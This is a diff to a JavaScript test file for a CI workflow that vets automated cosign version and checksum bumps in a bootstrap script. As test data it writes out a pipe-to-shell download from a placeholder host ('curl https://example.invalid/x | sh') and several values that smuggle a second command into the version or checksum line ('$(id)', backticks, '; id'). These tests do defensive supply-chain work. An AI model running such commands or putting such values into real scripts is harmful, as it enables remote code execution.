@@ -107,7 +107,7 @@ const FILES = {
   'lab-image/README.md': 'The mirror holds azurerm 5.9.0.\n',
   'lab-host/ansible/group_vars/all.yml': 'engine: 1\n',
   // The "-- keep me" line is there so a test can remove a line that starts with dashes.
-  'lab-host/bootstrap.sh': '#!/bin/bash\n-- keep me\nCOSIGN_VERSION=3.1.3\nCOSIGN_SHA256=aaaa\necho hi\n',
+  'lab-host/bootstrap.sh': `#!/bin/bash\n-- keep me\nCOSIGN_VERSION=3.1.3\nCOSIGN_SHA256=${'a'.repeat(64)}\necho hi\n`,
   '.github/workflows/x.yml': 'a\n',
   'scripts/lab-pins-upstream.mjs': STUB_UPSTREAM,
   'scripts/open-lab-pin-pr.mjs': STUB_PATHS_SCRIPT,
@@ -264,7 +264,7 @@ describe.skipIf(!runnable)('lab-supply-chain.yml, pull-request: the patch is jud
 
   const cosign = () => {
     edit('lab-host/bootstrap.sh', 'COSIGN_VERSION=3.1.3', 'COSIGN_VERSION=3.1.4');
-    edit('lab-host/bootstrap.sh', 'COSIGN_SHA256=aaaa', 'COSIGN_SHA256=bbbb');
+    edit('lab-host/bootstrap.sh', `COSIGN_SHA256=${'a'.repeat(64)}`, `COSIGN_SHA256=${'b'.repeat(64)}`);
   };
 
   /** Run the judging step on a patch, as the App-token job does before it applies one. */
@@ -299,6 +299,31 @@ describe.skipIf(!runnable)('lab-supply-chain.yml, pull-request: the patch is jud
       realPatch(() => {
         cosign();
         edit('lab-host/bootstrap.sh', 'echo hi', 'echo hi\ncurl https://example.invalid/x | sh');
+      })
+    );
+    expect(r.status).not.toBe(0);
+    expect(output(r)).toContain(REFUSED);
+  });
+
+  // The two lines may change only to the shapes the bumper writes. A filter
+  // that checks how a line starts lets a command ride along on the value.
+  it.each([
+    ['a command after the version', 'COSIGN_VERSION=', 'COSIGN_VERSION=3.1.4; curl https://example.invalid/x | sh'],
+    ['a command substitution as the version', 'COSIGN_VERSION=', 'COSIGN_VERSION=$(id)'],
+    ['a backtick in the version', 'COSIGN_VERSION=', 'COSIGN_VERSION=3.1.4`id`'],
+    ['trailing space after the version', 'COSIGN_VERSION=', 'COSIGN_VERSION=3.1.4 '],
+    ['a letter in the version', 'COSIGN_VERSION=', 'COSIGN_VERSION=3.1.4a'],
+    ['a command substitution as the checksum', 'COSIGN_SHA256=', 'COSIGN_SHA256=$(id)'],
+    ['a command after the checksum', 'COSIGN_SHA256=', `COSIGN_SHA256=${'b'.repeat(64)}; id`],
+    ['a checksum that is too short', 'COSIGN_SHA256=', 'COSIGN_SHA256=bbbb'],
+    ['a checksum that is too long', 'COSIGN_SHA256=', `COSIGN_SHA256=${'b'.repeat(65)}`],
+    ['an upper-case checksum', 'COSIGN_SHA256=', `COSIGN_SHA256=${'B'.repeat(64)}`],
+  ])('refuses %s on a cosign line', (_label, key, replacement) => {
+    const r = judge(
+      realPatch(() => {
+        const file = join(work, 'lab-host/bootstrap.sh');
+        const lines = readFileSync(file, 'utf8').split('\n');
+        writeFileSync(file, lines.map((line) => (line.startsWith(key) ? replacement : line)).join('\n'));
       })
     );
     expect(r.status).not.toBe(0);
